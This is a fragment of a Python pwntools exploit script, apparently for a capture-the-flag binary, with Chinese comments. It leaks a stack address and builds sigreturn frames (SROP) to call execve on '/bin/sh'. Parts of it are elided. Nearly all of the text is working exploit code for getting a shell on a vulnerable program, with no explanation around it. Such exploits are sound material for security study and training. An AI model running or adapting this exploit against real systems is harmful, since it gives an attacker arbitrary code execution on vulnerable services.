...
sh.send(payload)
sh.send('\xb3')
stack_addr = u64(sh.recv()[8:16])#泄露栈的地址
log.success('leak stack addr :' + hex(stack_addr))


#syscall调用sigreturn需要把rax设置为15,通过read实现
read = SigreturnFrame()
...
execv_frame_payload=p64(start_addr)+p64(syscall_ret)+bytes(execve)
#print len(execv_frame_payload)
execv_frame_payload_all=execv_frame_payload+(0x120-len(execv_frame_payload ))*b'\x00'+b'/bin/sh\x00'
